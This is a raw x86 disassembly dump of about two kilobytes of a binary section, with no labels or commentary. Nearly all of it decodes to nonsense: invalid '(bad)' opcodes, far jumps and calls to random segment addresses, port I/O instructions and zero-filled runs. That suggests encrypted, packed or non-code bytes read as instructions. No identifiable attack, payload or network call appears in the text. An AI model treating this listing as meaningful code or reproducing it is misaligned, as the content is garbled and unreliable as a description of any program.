  422cec:	cmp    edx,esp
  422cee:	sub    BYTE PTR [ecx+0x0],bh
	...
  422cfd:	add    BYTE PTR [esi],bl
  422cff:	test   eax,0x7ff735f6
  422d04:	fild   QWORD PTR [ebx-0x5f9ed871]
  422d0a:	xchg   ebx,eax
  422d0b:	out    dx,al
  422d0c:	out    0xb1,al
  422d0e:	lahf   
  422d0f:	rol    DWORD PTR [ecx],cl
  422d11:	add    BYTE PTR [edx+0x0],bl
  422d14:	add    BYTE PTR [eax],al
  422d16:	rcl    DWORD PTR [esi-0x2d3b5f67],1
  422d1c:	dec    ecx
  422d1d:	or     eax,0x60
  422d20:	jmp    0x7112:0x635911da
  422d27:	gs jp  0x422d39
  422d2a:	out    dx,al
  422d2b:	push   ss
  422d2c:	mov    ecx,0xfdc78c68
  422d31:	dec    edi
  422d32:	rcr    edi,0xf2
  422d35:	pop    edx
  422d36:	mov    bl,0xd0
  422d38:	inc    eax
  422d39:	sbb    bh,BYTE PTR [edi]
  422d3b:	adc    esi,esi
  422d3d:	jns    0x422d5c
  422d3f:	inc    ebx
  422d40:	jb     0x422d11
  422d42:	jb     0x422d62
  422d44:	jmp    DWORD PTR [ecx+0x9]
  422d47:	cmp    al,0xc3
  422d49:	sub    al,dh
  422d4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d4c:	xchg   ebp,eax
  422d4d:	pop    ss
  422d4e:	dec    ebx
  422d4f:	xchg   esi,eax
  422d50:	jle    0x422d3f
  422d52:	je     0x422ce7
  422d54:	iret   
  422d55:	daa    
  422d56:	jmp    0x7a986d22
  422d5b:	jge    0x422d7f
  422d5d:	mov    cl,BYTE PTR [edx-0x2c]
  422d60:	mov    eax,0xa69e64f
  422d65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d66:	pop    edi
  422d67:	xor    BYTE PTR [edi+0x42],al
  422d6a:	sub    ecx,DWORD PTR [ebx-0x3c9673cf]
	...
  422d7c:	add    BYTE PTR [eax],al
  422d7e:	fwait
  422d7f:	loope  0x422dee
  422d81:	sub    eax,0xf7dbad7f
  422d86:	sar    BYTE PTR [ebx],cl
  422d88:	(bad)  
  422d89:	add    BYTE PTR [edi+0x40],al
  422d8c:	dec    edi
  422d8d:	aam    0xf9
  422d8f:	rol    DWORD PTR [ecx],cl
  422d91:	add    BYTE PTR [edx+0x0],bl
  422d94:	add    BYTE PTR [eax],al
  422d96:	jg     0x422d57
  422d98:	ror    BYTE PTR [ebx-0x49],1
  422d9b:	clc    
  422d9c:	or     dh,al
  422d9e:	lahf   
  422d9f:	lods   al,BYTE PTR ds:[esi]
  422da0:	mov    bh,0xd9
  422da2:	push   esi
  422da3:	je     0x422d95
  422da5:	sbb    eax,edi
  422da7:	or     eax,edi
  422da9:	mov    DWORD PTR [eax-0x47],edx
  422dac:	cli    
  422dad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422dae:	pop    edi
  422daf:	mov    ebx,0x3b213dba
  422db4:	stos   BYTE PTR es:[edi],al
  422db5:	or     BYTE PTR [eax],al
  422db7:	sar    DWORD PTR ds:0x2be0dfe4,1
  422dbd:	retf   0x2b23
  422dc0:	and    eax,0x18cd9b08
  422dc5:	xchg   ebx,eax
  422dc6:	lea    edi,[ecx+0x59]
  422dc9:	mov    ecx,0x72221ca3
  422dce:	sbb    BYTE PTR [ecx-0xf],0xfa
  422dd2:	(bad)  
  422dd4:	jp     0x422db3
  422dd6:	cmp    al,0xdf
  422dd8:	aam    0x98
  422dda:	mov    eax,0x818f2c15
  422ddf:	gs in  eax,dx
  422de1:	mov    BYTE PTR [ebx+0x7c082a9b],dh
  422de7:	xchg   DWORD PTR [ebx],esp
  422de9:	adc    eax,0xe0cf4b4a
  422dee:	mov    DWORD PTR [edx+0x0],0x0
  422df8:	add    BYTE PTR [eax],al
  422dfa:	add    BYTE PTR [eax],al
  422dfc:	add    BYTE PTR [eax],al
  422dfe:	or     bh,dh
  422e00:	ja     0x422e4c
  422e02:	dec    edx
  422e04:	cmp    eax,0x2e8eedf7
  422e09:	dec    eax
  422e0a:	lods   al,BYTE PTR ds:[esi]
  422e0b:	mov    bl,0x1d
  422e0d:	xchg   ecx,eax
  422e0e:	push   ebx
  422e0f:	aam    0x1
  422e11:	add    BYTE PTR [edx+0x0],bl
  422e14:	add    BYTE PTR [eax],al
  422e16:	mov    ds:0x5b127725,al
  422e1b:	adc    eax,0x39dfe61c
  422e20:	pop    es
  422e21:	nop
  422e22:	imul   edx,DWORD PTR [eax+ecx*1-0x2502086d],0x47
  422e2a:	pop    eax
  422e2b:	or     al,0xe1
  422e2d:	enter  0x54ea,0x17
  422e31:	jo     0x422e70
  422e33:	fidivr WORD PTR [ebx+0x3a]
  422e36:	push   ebp
  422e37:	ror    DWORD PTR [ebp+0x57a9fd],1
  422e3d:	adc    DWORD PTR [ebx+0x9f0b4e2],ecx
  422e43:	call   0x1f8c:0x1135709f
  422e4a:	dec    edi
  422e4b:	and    BYTE PTR [ecx+0x5768d092],dh
  422e51:	fsub   QWORD PTR [ecx-0x45]
  422e54:	pushf  
  422e55:	inc    ch
  422e57:	and    dh,BYTE PTR [edi+edi*8]
  422e5a:	cli    
  422e5b:	fs push ds
  422e5d:	mov    ds:0xf1bff236,eax
  422e62:	dec    ebx
  422e63:	repz (bad) [esi+0x20]
  422e67:	pushf  
  422e68:	and    ch,bh
  422e6a:	cmp    edx,DWORD PTR [edi]
  422e6c:	pusha  
  422e6d:	xlat   BYTE PTR ds:[ebx]
  422e6e:	mov    dl,0x2d
	...
  422e7c:	add    BYTE PTR [eax],al
  422e7e:	arpl   WORD PTR ss:[eax-0x10],bp
  422e82:	jge    0x422e7f
  422e84:	mov    esi,0x8c7853e7
  422e89:	daa    
  422e8a:	into   
  422e8b:	test   BYTE PTR [ecx+0x1d4ad1e],dl
  422e91:	add    BYTE PTR [edx+0x0],bl
  422e94:	add    BYTE PTR [eax],al
  422e96:	sbb    ecx,ecx
  422e98:	into   
  422e99:	jmp    0x422ef4
  422e9b:	in     al,dx
  422e9c:	mov    ecx,0xaf465f25
  422ea1:	jbe    0x422f0a
  422ea3:	push   ds
  422ea4:	and    BYTE PTR [esi+0x41],bl
  422ea7:	shl    BYTE PTR [edi],cl
  422ea9:	push   ecx
  422eaa:	or     BYTE PTR [ecx-0x29],cl
  422ead:	xchg   esi,eax
  422eae:	add    BYTE PTR [edi-0x428d1eab],bl
  422eb4:	sbb    eax,0xe023f7d9
  422eb9:	ss (bad) 
  422ebb:	cmp    eax,0x5ddaf804
  422ec0:	xor    ebx,0x646b0caa
  422ec6:	(bad)  
  422ec7:	jns    0x422e7e
  422ec9:	or     al,0xa3
  422ecb:	dec    edi
  422ecc:	cmp    dh,BYTE PTR [edi+0x16e62fcc]
  422ed2:	hlt    
  422ed3:	xor    esi,eax
  422ed5:	sar    edi,cl
  422ed7:	mov    al,0x78
  422ed9:	mov    cl,0x9
  422edb:	push   eax
  422edc:	bound  edi,QWORD PTR [eax-0x12]
  422edf:	inc    edx
  422ee0:	in     eax,dx
  422ee1:	test   al,0xb4
  422ee3:	sbb    dl,BYTE PTR [ebx+0x36]
  422ee6:	fadd   DWORD PTR ds:0xd452805e
  422eec:	aad    0xa4
  422eee:	hlt    
  422eef:	cwde   
	...
  422efc:	add    BYTE PTR [eax],al
  422efe:	daa    
  422eff:	ss lahf 
  422f01:	xor    DWORD PTR [edi+0x1536afb9],ebx
  422f07:	and    eax,0x71da075b
  422f0c:	outs   dx,DWORD PTR ds:[esi]
  422f0d:	jmp    0x440ac7
  422f12:	pop    edx
  422f13:	add    BYTE PTR [eax],al
  422f15:	add    BYTE PTR [ebx+0x47],bh
  422f18:	(bad)  [eax+edi*1-0x5]
  422f1c:	ins    BYTE PTR es:[edi],dx
  422f1d:	add    esi,DWORD PTR [edi]
  422f1f:	data16 jp 0x422f95
  422f22:	sub    DWORD PTR [ebx],edx
  422f24:	dec    ecx
  422f25:	lods   al,BYTE PTR ds:[esi]
  422f26:	dec    edi
  422f27:	int    0x56
  422f29:	mov    ecx,0xd9623a6a
  422f2e:	into   
  422f2f:	stos   DWORD PTR es:[edi],eax
  422f30:	mov    WORD PTR [edx],cs
  422f32:	dec    BYTE PTR [esi]
  422f34:	in     al,0xfd
  422f36:	sbb    eax,ebp
  422f38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f39:	mov    dl,0xd
  422f3b:	xlat   BYTE PTR ds:[ebx]
  422f3c:	nop
  422f3d:	arpl   WORD PTR [edi-0x18],sp
  422f40:	out    0x71,eax
  422f42:	das    
  422f43:	dec    esp
  422f44:	cmp    esi,DWORD PTR [eax+0x5b1914db]
  422f4a:	pop    ecx
  422f4b:	loope  0x422f8e
  422f4d:	sbb    edi,ebp
  422f4f:	mov    esi,0x7b8703e9
  422f54:	mov    BYTE PTR [esi-0x6b6e4e86],bl
  422f5a:	outs   dx,DWORD PTR ds:[esi]
  422f5b:	or     esp,DWORD PTR [edi-0x1a]
  422f5e:	stos   BYTE PTR es:[edi],al
  422f5f:	mov    ecx,edi
  422f61:	xchg   ecx,eax
  422f62:	xchg   ebx,eax
  422f63:	jns    0x422f23
  422f65:	mov    gs,eax
  422f67:	mov    ch,0x36
  422f69:	lea    eax,[esi+0x75e03f3e]
  422f6f:	dec    esp
	...
  422f7c:	add    BYTE PTR [eax],al
  422f7e:	aaa    
  422f7f:	(bad)  
  422f80:	out    0xc2,eax
  422f82:	mul    ebx
  422f84:	aaa    
  422f85:	cmc    
  422f86:	xchg   ecx,eax
  422f87:	call   0xf19c:0xd541eef4
  422f8e:	paddusb mm0,QWORD PTR [ecx]
  422f91:	add    BYTE PTR [edx+0x0],bl
  422f94:	add    BYTE PTR [eax],al
  422f96:	add    eax,DWORD PTR [eax-0x5e]
  422f99:	test   DWORD PTR [ecx+0x39],0x292badb2
  422fa0:	adc    eax,DWORD PTR [esi+0x3e]
  422fa3:	jae    0x422f69
  422fa5:	outs   dx,DWORD PTR ds:[esi]
  422fa6:	outs   dx,DWORD PTR ds:[esi]
  422fa7:	push   ds
  422fa8:	call   0x4916:0xf29e7d74
  422faf:	les    eax,FWORD PTR [edi+ebp*1+0x2ca2ef8b]
  422fb6:	pop    ecx
  422fb7:	test   DWORD PTR [edi-0x2c949070],ecx
  422fbd:	mov    cs,edi
  422fbf:	sub    ebx,DWORD PTR [ecx-0x50]
  422fc2:	repnz gs mov bl,0x1d
  422fc6:	(bad)  
  422fc7:	jecxz  0x423039
  422fc9:	lds    ecx,FWORD PTR [ebx-0x15]
  422fcc:	mov    ebp,0x953d2c4c
  422fd1:	sbb    al,ch
  422fd3:	in     al,dx
  422fd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fd5:	(bad)  
  422fd6:	call   0xba1bf227
  422fdb:	lea    edi,[edi-0xe]
  422fde:	aad    0xf4
  422fe0:	mov    edx,0x5848ecd5
  422fe5:	mov    ds:0x32c6a122,al
  422fea:	cwde   
  422feb:	test   dh,0x88
  422fee:	pop    ebp
  422fef:	stos   DWORD PTR es:[edi],eax
	...
  422ffc:	add    BYTE PTR [eax],al
  422ffe:	push   ss
  422fff:	aad    0xdf
  423001:	out    dx,eax
  423002:	fucomip st,st(7)
  423004:	ss std 
  423006:	cmp    BYTE PTR [esi-0x607a0c6],al
  42300c:	pop    ebp
  42300d:	stc    
  42300e:	imul   ebx,esp,0x5a0001
  423014:	add    BYTE PTR [eax],al
  423016:	mov    ebp,0x689ce367
  42301b:	(bad)  
  42301c:	adc    al,0x4c
  42301e:	pop    edi
  42301f:	sbb    BYTE PTR [edx-0x29],0xc1
  423023:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423024:	cmp    ecx,DWORD PTR ds:0x14eb4e09
  42302a:	ss jmp 0x422fcd
  42302d:	xor    ah,BYTE PTR [edx-0x22cf0e1d]
  423033:	fcmovu st,st(5)
  423035:	xlat   BYTE PTR ds:[ebx]
  423036:	ret    0x2ee
  423039:	inc    edx
  42303a:	mov    dl,0x9b
  42303c:	xchg   ecx,eax
  42303d:	sbb    BYTE PTR [ebx+0x47],0xd2
  423041:	jge    0x42304a
  423043:	sbb    bh,ah
  423045:	cmp    cl,ch
  423047:	adc    cl,BYTE PTR [eax+esi*8]
  42304a:	lahf   
  42304b:	call   DWORD PTR [ebp-0x6584bf1c]
  423051:	dec    edx
  423052:	(bad)  
  423054:	adc    bh,BYTE PTR [edx-0x4abbdb6]
  42305a:	mul    DWORD PTR ds:0x4935ba1e
  423060:	cmp    al,0xe4
  423062:	push   esi
  423063:	dec    ecx
  423064:	pusha  
  423065:	cld    
  423066:	std    
  423067:	es jmp 0xce44:0xcf879377
  42306f:	jae    0x423071
	...
  42307d:	add    BYTE PTR [esi+0x76],ch
  423080:	in     al,0xca
  423082:	cld    
  423083:	fisubr DWORD PTR [esi-0xa]
  423086:	sbb    BYTE PTR [edx-0x46e06879],dl
  42308c:	stc    
  42308d:	jmp    0x5a:0x1dcc3
  423094:	add    BYTE PTR [eax],al
  423096:	mov    esp,edx
  423098:	mov    al,ds:0xc7f07f4
  42309d:	xchg   esp,eax
  42309e:	pop    esp
  42309f:	ror    bl,1
  4230a1:	mov    al,ds:0xde08b4bb
  4230a6:	push   ecx
  4230a7:	arpl   WORD PTR [ecx],dx
  4230a9:	jae    0x4230d4
  4230ab:	fild   DWORD PTR [ebx-0x25]
  4230ae:	arpl   WORD PTR [esi+0x4038b99e],di
  4230b4:	mov    cl,0xb3
  4230b6:	push   ebp
  4230b7:	cmp    al,0xb1
  4230b9:	jb     0x423126
  4230bb:	lahf   
  4230bc:	dec    edi
  4230bd:	dec    ebp
  4230be:	ss pop edx
  4230c0:	jle    0x423080
  4230c2:	add    DWORD PTR [ebp-0x24248250],0x31aa895f
  4230cc:	popf   
  4230cd:	rcl    DWORD PTR [ecx-0x1f],0x13
  4230d1:	mov    eax,ds:0xe8fee046
  4230d6:	fwait
  4230d7:	or     ebx,DWORD PTR [ebp+0x3d6c07b1]
  4230dd:	dec    edi
  4230de:	imul   edi,DWORD PTR ds:0x2bcb4b4e,0x6ab0b299
  4230e8:	xor    DWORD PTR [ebx],ecx
  4230ea:	cmp    eax,0x6eda9eca
  4230ef:	fld    DWORD PTR [eax]
	...
  4230fd:	add    BYTE PTR [edx],bh
  4230ff:	push   edx
  423100:	les    ecx,FWORD PTR [edi]
  423102:	in     al,dx
  423103:	lahf   
  423104:	sti    
  423105:	ja     0x4230fd
  423107:	rcl    DWORD PTR [eax+0x7be7dbd3],1
  42310d:	ficomp DWORD PTR ds:0x5a0001dd
  423113:	add    BYTE PTR [eax],al
  423115:	add    al,ch
  423117:	nop
  423118:	jo     0x4230ce
  42311a:	ss push ss
  42311c:	sub    ch,dl
  42311e:	rcl    BYTE PTR [edx+eiz*1+0xcc0b7db],1
  423125:	out    0x35,eax
  423127:	adc    ebx,ebx
  423129:	out    0x27,eax
  42312b:	xor    eax,0x90a5701f
  423130:	rol    DWORD PTR [ebx-0x20],cl
  423133:	es (bad) 
  423135:	sbb    al,0x15
  423137:	call   DWORD PTR [edi-0xf]
  42313a:	push   edx
  42313b:	sub    ecx,DWORD PTR [ebp+0x6f6eed20]
  423141:	add    ecx,ecx
  423143:	pop    esi
  423144:	and    BYTE PTR fs:[ebp-0x18],ah
  423148:	xchg   esi,eax
  423149:	xchg   DWORD PTR [ecx+0x14396dee],edi
  42314f:	add    dh,dl
  423151:	sub    esi,DWORD PTR [eax+0x4fd07b91]
  423157:	lods   al,BYTE PTR ds:[esi]
  423158:	cmp    al,0x8d
  42315a:	jnp    0x4230de
  42315c:	arpl   WORD PTR [esp+edx*8],sp
  42315f:	fisubr WORD PTR [esi]
  423161:	pop    edi
  423162:	cli    
  423163:	(bad)  
  423164:	mov    dh,0x65
  423166:	add    eax,0x8ade2c27
  42316b:	jbe    0x423130
  42316d:	jno    0x423193
  42316f:	dec    ebx
	...
  42317c:	add    BYTE PTR [eax],al
  42317e:	xchg   ebx,eax
  42317f:	cmp    DWORD PTR [ebp-0x2c814294],0xffffffff
  423186:	push   eax
  423187:	loopne 0x423183
  423189:	call   0xdd77:0x3a11fe39
  423190:	add    DWORD PTR [eax],eax
  423192:	pop    edx
  423193:	add    BYTE PTR [eax],al
  423195:	add    BYTE PTR [edx],bl
  423197:	inc    edx
  423198:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423199:	inc    ebp
  42319a:	inc    esi
  42319b:	rcl    BYTE PTR [ebx],0x45
  42319e:	dec    ecx
  42319f:	shl    BYTE PTR ds:0x8a5a2c56,0xc
  4231a6:	xchg   ecx,eax
  4231a7:	mov    gs,WORD PTR [ebp+0x21]
  4231aa:	in     al,0x27
  4231ac:	sub    DWORD PTR [eax+ebp*4-0x61],edi
  4231b0:	ret    0x2aaf
  4231b3:	jns    0x423143
  4231b5:	out    dx,eax
  4231b6:	dec    edi
  4231b7:	scas   eax,DWORD PTR es:[edi]
  4231b8:	or     eax,0xcbf98003
  4231bd:	push   esi
  4231be:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4231c0:	aam    0xef
  4231c2:	stos   BYTE PTR es:[edi],al
  4231c3:	scas   eax,DWORD PTR es:[edi]
  4231c4:	ret    0x13f6
  4231c7:	test   ebp,ebp
  4231c9:	addr16 je 0x423161
  4231cc:	hlt    
  4231cd:	mov    dl,0x65
  4231cf:	gs or  dh,dl
  4231d2:	jmp    0x423208
  4231d4:	(bad)  
  4231d5:	ins    DWORD PTR es:[edi],dx
  4231d6:	jne    0x42323f
  4231d8:	jnp    0x423238
  4231da:	or     BYTE PTR [ecx+0x62adb1e9],al
  4231e0:	or     ecx,DWORD PTR [ecx]
  4231e2:	into   
  4231e3:	and    ecx,DWORD PTR [eax]
  4231e5:	xchg   esp,eax
  4231e6:	js     0x42322c
  4231e8:	sbb    BYTE PTR [esi-0x59e3eee9],al
  4231ee:	out    dx,al
  4231ef:	int3   
	...
  4231fc:	add    BYTE PTR [eax],al
  4231fe:	(bad)  
  423200:	test   eax,0xddffeef7
  423206:	and    al,0x1
  423208:	pop    ebp
  423209:	dec    edi
  42320a:	mov    dh,BYTE PTR [ecx+0x2e]
  42320d:	jo     0x4231e0
  42320f:	fld    QWORD PTR [ecx]
  423211:	add    BYTE PTR [edx+0x0],bl
  423214:	add    BYTE PTR [eax],al
  423216:	cwde   
  423217:	push   cs
  423218:	mov    cl,ch
  42321a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42321b:	push   esi
  42321c:	jne    0x423233
  42321e:	cs dec eax
  423220:	stos   DWORD PTR es:[edi],eax
  423221:	push   DWORD PTR [ebp+0x4f]
  423224:	in     al,0xca
  423226:	mov    ds:0x569ae7da,al
  42322b:	or     DWORD PTR [ebp-0x59],edi
  42322e:	pop    ebx
  42322f:	shr    ebp,0xee
  423232:	clc    
  423233:	(bad)  
  423235:	mov    edx,0xb23bd473
  42323a:	imul   ebx,DWORD PTR es:[esi+0x77a70a71],0x3a231ba5
  423245:	dec    eax
  423246:	dec    edi
  423247:	rcl    al,0x7e
  42324a:	popa   
  42324b:	(bad)  
  42324c:	xor    cl,BYTE PTR [ebp+0x1d]
  42324f:	xchg   ebp,eax
  423250:	mov    ebp,0x86bf1232
  423255:	jns    0x42322f
  423257:	sti    
  423258:	sahf   
  423259:	or     al,bl
  42325b:	dec    edi
  42325c:	mov    cl,0x45
  42325e:	test   BYTE PTR [eax+0x64],bl
  423261:	and    ecx,esi
  423263:	or     ebp,esi
  423265:	sbb    eax,DWORD PTR [ebp+0x5a0b7802]
  42326b:	test   bl,0x30
  42326e:	add    esi,0x0
	...
  42327c:	add    BYTE PTR [eax],al
  42327e:	outs   dx,DWORD PTR ds:[esi]
  42327f:	mov    ds:0x7edd2ad4,al
  423284:	jmp    edi
  423286:	push   edx
  423287:	fcmovu st,st(5)
  423289:	in     eax,0xfa
  42328b:	mov    cl,0xde
  42328d:	test   eax,0x1de2b
  423292:	pop    edx
  423293:	add    BYTE PTR [eax],al
  423295:	add    BYTE PTR [esi],dh
  423297:	pop    ecx
  423298:	ds sub eax,0xbc387c63
  42329e:	xchg   ebx,eax
  42329f:	xchg   ch,bh
  4232a1:	mov    ecx,0xed3609fd
  4232a6:	push   es
  4232a7:	stos   BYTE PTR es:[edi],al
  4232a8:	ja     0x4232ee
  4232aa:	jbe    0x423249
  4232ac:	mov    dl,0xf0
  4232ae:	jecxz  0x423261
  4232b0:	mov    ds:0x762a28f,eax
  4232b5:	mov    ch,0xe5
  4232b7:	sbb    BYTE PTR [ecx+0x32],0x1a
  4232bb:	data16 in al,dx
  4232bd:	push   ss
  4232be:	mov    ds:0xa1923b51,al
  4232c3:	mov    esi,0xde1af0ec
  4232c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232c9:	xor    DWORD PTR [ecx],ebp
  4232cb:	pop    ecx
  4232cc:	push   esp
  4232cd:	scas   al,BYTE PTR es:[edi]
  4232ce:	adc    esp,edi
  4232d0:	shl    DWORD PTR [ecx],0xb
  4232d3:	xchg   dh,al
  4232d5:	pop    edi
  4232d6:	out    dx,eax
  4232d7:	test   bh,dh
  4232d9:	bnd jg 0x4232a9
  4232dc:	mov    edi,0x1c0eddd8
  4232e1:	and    al,0x67
  4232e3:	cmp    dh,BYTE PTR [ebp-0x443174ff]
  4232e9:	cdq    
  4232ea:	icebp  
  4232eb:	push   0xffffffe9
  4232ed:	shl    DWORD PTR [edx+0x47],1
	...
  4232fc:	add    BYTE PTR [eax],al
  4232fe:	stc    
  4232ff:	sbb    al,al
  423301:	inc    esi
  423302:	jecxz  0x4232e2
  423304:	(bad)  
  423305:	mov    edi,0xe1f1bc83
  42330a:	bound  ebp,QWORD PTR [eax]
  42330c:	pop    esi
  42330d:	mov    ds:0x1de85,al
  423312:	pop    edx
  423313:	add    BYTE PTR [eax],al
  423315:	add    bl,dh
  423317:	hlt    
  423318:	clc    
  423319:	mov    ebp,0xf502f372
  42331e:	test   DWORD PTR [ebp+0x6c01d10c],ebx
  423324:	ja     0x42337f
  423326:	out    0x27,al
  423328:	inc    ebx
  423329:	jg     0x423320
  42332b:	stos   BYTE PTR es:[edi],al
  42332c:	jae    0x423388
  42332e:	out    dx,al
  42332f:	mov    eax,0xc94b2774
  423334:	je     0x4232cf
  423336:	aad    0xd3
  423338:	int3   
  423339:	rol    BYTE PTR [edx-0x3251e631],0xc0
  423340:	enter  0xcde7,0xa8
  423344:	mov    bh,dl
  423346:	inc    esi
  423347:	popa   
  423348:	xchg   esi,eax
  423349:	add    al,0x82
  42334b:	out    dx,al
  42334c:	xchg   ecx,edx
  42334e:	nop
  42334f:	pusha  
  423350:	inc    esi
  423351:	sbb    al,0x42
  423353:	in     eax,0x44
  423355:	and    dh,BYTE PTR [ecx-0x1f8f88e4]
  42335b:	pop    ebx
  42335c:	mov    edx,0x32b88b06
  423361:	in     eax,dx
  423362:	or     BYTE PTR [ebx+0x7388c54e],dl
  423368:	(bad)  
  42336a:	out    0x0,eax
  42336c:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42336e:	push   ecx
  42336f:	fiadd  DWORD PTR [eax]
	...
  42337d:	add    BYTE PTR [ecx+0x3e8336b9],ah
  423383:	(bad)  
  423384:	mov    ch,0xbb
  423386:	icebp  
  423387:	and    eax,0x9b1a8c27
  42338c:	outs   dx,DWORD PTR ds:[esi]
  42338d:	jg     0x42336e
  42338f:	fiadd  WORD PTR [ecx]
  423391:	add    BYTE PTR [edx+0x0],bl
  423394:	add    BYTE PTR [eax],al
  423396:	sbb    eax,0x1aff1466
  42339b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42339c:	bound  esi,QWORD PTR [ecx-0x18]
  42339f:	dec    esp
  4233a0:	mov    al,0xe9
  4233a2:	inc    DWORD PTR [esi+0x71f9cdc]
  4233a8:	sbb    DWORD PTR [edi],ecx
  4233aa:	sub    edi,DWORD PTR [esi+ecx*4-0x72b926b6]
  4233b1:	xchg   esp,eax
  4233b2:	add    dh,BYTE PTR [ebx+eiz*1-0xbce9f24]
  4233b9:	xchg   edi,eax
  4233ba:	out    0x42,al
  4233bc:	dec    ecx
  4233bd:	sbb    al,0xfa
  4233bf:	cmp    al,0x13
  4233c1:	pop    edi
  4233c2:	mov    eax,ds:0xa594c29e
  4233c7:	push   edx
  4233c8:	std    
  4233c9:	shr    esp,0xf8
  4233cc:	xor    al,0xbf
  4233ce:	call   0x776e:0x9dc3d923
  4233d5:	pop    edi
  4233d6:	xor    WORD PTR [ecx+0x4f],0x60fd
  4233dc:	int3   
  4233dd:	pop    ecx
  4233de:	mov    ebx,DWORD PTR [ebx+0x61]
  4233e1:	cmp    BYTE PTR [ebx-0x5a],ah
  4233e4:	rcr    BYTE PTR [eax],1
  4233e6:	(bad)  
  4233e7:	mov    ebp,0xc99d1b12
  4233ec:	fwait
  4233ed:	xchg   DWORD PTR [ecx+0x2c],esp
	...
  4233fb:	add    BYTE PTR [eax],al
  4233fd:	add    BYTE PTR [edx],dl
  4233ff:	xlat   BYTE PTR ds:[ebx]
  423400:	repz or esi,edi
  423403:	das    
  423404:	cli    
  423405:	fist   WORD PTR [ecx]
  423407:	dec    ebx
  423408:	es nop
  42340a:	jne    0x423429
  42340c:	mov    al,0xab
  42340e:	cmp    edi,ebx
  423410:	add    DWORD PTR [eax],eax
  423412:	pop    edx
  423413:	add    BYTE PTR [eax],al
  423415:	add    dh,al
  423417:	jp     0x423461
  423419:	call   FWORD PTR [ecx+0x71]
  42341c:	lods   al,BYTE PTR ds:[esi]
  42341d:	adc    ch,BYTE PTR [edi+0x4c]
  423420:	loopne 0x423418
  423422:	cs cmp eax,0xde0346fc
  423428:	dec    ebx
  423429:	cld    
  42342a:	mov    eax,0xcd2cdbd2
  42342f:	sbb    esi,DWORD PTR [eax-0x31f8b6a4]
  423435:	(bad)  
  423436:	sub    al,0xba
  423438:	xor    BYTE PTR [ebp+ebx*1+0xe6d3525],dh
  42343f:	add    DWORD PTR [ecx+0x78],eax
  423442:	or     eax,0xaf3684cd
  423447:	out    dx,eax
  423448:	mov    esi,0x9d53f42b
  42344d:	not    BYTE PTR [edx+0x205de759]
  423453:	dec    ebx
  423454:	xchg   edi,eax
  423455:	test   al,0x72
  423457:	pop    eax
  423458:	inc    edi
  423459:	rcl    DWORD PTR [eax-0x5d0d5e2b],1
  42345f:	cwde   
  423460:	xchg   ecx,eax
  423461:	test   ecx,0x223dd316
  423467:	add    ebx,edi
  423469:	adc    ax,0x7ae4
  42346d:	mov    esi,0xa967
	...
  42347e:	adc    bh,BYTE PTR [edx-0x19073928]
  423484:	push   ds
  423485:	(bad)  
  423486:	adc    bl,dh
  423488:	cwde   
  423489:	out    dx,al
  42348a:	sub    dl,ah
  42348c:	test   al,0xb0
  42348e:	xchg   ebx,eax
  42348f:	fild   WORD PTR [ecx]
  423491:	add    BYTE PTR [edx+0x0],bl
  423494:	add    BYTE PTR [eax],al
  423496:	(bad)  
  423497:	popa   
  423498:	mov    eax,ds:0xd5c7fa6e
  42349d:	(bad)
  4234a1:	xor    eax,0xfc4a6457
  4234a6:	cwde   
  4234a7:	shl    DWORD PTR [edi+ebx*8],cl
  4234aa:	test   eax,0x21245989
  4234b0:	leave  
  4234b1:	lods   al,BYTE PTR ds:[esi]
  4234b2:	xchg   ebp,eax
  4234b3:	scas   al,BYTE PTR es:[edi]
  4234b4:	pop    ebp
  4234b5:	xchg   edx,eax
  4234b6:	test   DWORD PTR ds:0xee6ed985,ebp
  4234bc:	pusha  
  4234bd:	or     DWORD PTR [ebx+edx*2+0x9],esp
  4234c1:	mov    bl,0x84
  4234c3:	sbb    ebx,DWORD PTR ds:0x2aaa013b
  4234c9:	cmp    ebp,DWORD PTR [esi-0x67]
  4234cc:	mov    dx,0xd1ac
  4234d0:	push   ebx
  4234d1:	jae    0x4234aa
  4234d3:	adc    dh,BYTE PTR [ebx]
  4234d5:	rcr    DWORD PTR [edi-0x54],0x9b
  4234d9:	mov    ah,0x9b
  4234db:	or     esi,DWORD PTR [eax+esi*4-0x71ab766]
  4234e2:	pusha  
  4234e3:	mov    dh,0xc2
  4234e5:	hlt    
  4234e6:	push   0x518e1833
  4234eb:	(bad)  
  4234ec:	hlt    
  4234ed:	inc    edi
  4234ee:	and    BYTE PTR [edx+0x0],dl
	...
  4234fc:	add    BYTE PTR [eax],al
  4234fe:	add    al,al
  423500:	inc    edx
  423501:	add    BYTE PTR [eax+eax*8],al
  423504:	inc    edx
  423505:	add    BYTE PTR [eax],cl
  423507:	rol    BYTE PTR [edx+0x0],0xc
  42350b:	rol    BYTE PTR [edx+0x0],0x10
  42350f:	rol    BYTE PTR [edx+0x0],0x14
  423513:	rol    BYTE PTR [edx+0x0],0x18
  423517:	rol    BYTE PTR [edx+0x0],0x1c
  42351b:	rol    BYTE PTR [edx+0x0],0x57
  42351f:	inc    edi
  423520:	cmp    DWORD PTR [edi+0x41],ebx
  423523:	pop    eax
  423524:	ss push esi
  423526:	pop    edi
  423527:	cmp    BYTE PTR [eax],al
  423529:	inc    ebx
  42352a:	inc    ebp
  42352b:	dec    esp
  42352c:	pop    edi
  42352d:	pop    eax
  42352e:	push   edi
  42352f:	dec    eax
  423530:	inc    edx
  423531:	add    BYTE PTR [edi+0x50],dl
  423534:	xor    eax,0x4641365f
  423539:	cmp    DWORD PTR [edx],esi
  42353b:	xor    ebx,DWORD PTR [edi+0x32]
  42353e:	aaa    
  42353f:	add    BYTE PTR [eax+0x48],dl
  423542:	xor    BYTE PTR [edi+0x58],bl
  423545:	push   esp
  423546:	inc    ecx
  423547:	dec    ebp
  423548:	push   ecx
  423549:	pop    edi
  42354a:	inc    esi
